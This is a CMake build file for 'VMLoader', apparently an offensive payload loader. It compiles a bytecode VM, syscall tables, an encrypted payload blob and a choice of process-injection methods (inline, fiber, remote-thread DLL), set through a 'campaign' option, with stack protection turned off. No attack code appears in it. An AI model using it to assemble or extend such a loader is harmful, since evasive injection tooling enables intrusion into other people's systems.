cmake_minimum_required(VERSION 3.20)
project(VMLoader CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# ── Campaign config ──────────────────────────────────────────────────────────
# Injection technique: 0=inline, 1=fiber, 2=remote_thread (DLL injection)
set(JANUS_INJECT_TECHNIQUE 0 CACHE STRING "Injection technique (0=inline, 1=fiber, 2=remote_thread)")

# ── VM + Loader library ───────────────────────────────────────────────────────
add_library(vmcore STATIC
    src/vm/core.cpp
    src/vm/alu.cpp
    src/vm/mem.cpp
    src/vm/branch.cpp
    src/vm/system.cpp
    src/syscall/winapi.cpp
    src/syscall/table.cpp
    src/loader/crypto.cpp
    src/loader/loader.cpp
    src/loader/payload_blob.cpp
    src/inject/inline.cpp
    src/inject/fiber.cpp
    src/inject/remote_thread.cpp
)

target_include_directories(vmcore PUBLIC include)
target_compile_definitions(vmcore PUBLIC JANUS_INJECT_TECHNIQUE=${JANUS_INJECT_TECHNIQUE})

if (MSVC)
    target_compile_options(vmcore PRIVATE /O2 /GS- /W4)
    target_compile_definitions(vmcore PRIVATE _CRT_SECURE_NO_WARNINGS)
else()
    target_compile_options(vmcore PRIVATE -O2 -Wall -Wextra)
endif()

# ── Targets depend on technique ──────────────────────────────────────────────
if (JANUS_INJECT_TECHNIQUE EQUAL 2)
    # Technique 2: build injector EXE + payload DLL

    add_executable(VMInjector src/main.cpp)
    target_link_libraries(VMInjector PRIVATE vmcore kernel32)

    add_library(VMPayloadDll SHARED src/inject/dllmain.cpp)
    target_link_libraries(VMPayloadDll PRIVATE vmcore kernel32)
    set_target_properties(VMPayloadDll PROPERTIES OUTPUT_NAME "VMLoader")
else()
    # Technique 0 or 1: single loader executable
    add_executable(VMLoader src/main.cpp)
    target_link_libraries(VMLoader PRIVATE vmcore kernel32)
endif()

# ── Build payload separately ──────────────────────────────────────────────────
# cd payload && cmake -B build -DCMAKE_TOOLCHAIN_FILE=../cmake/riscv64.cmake && cmake --build build
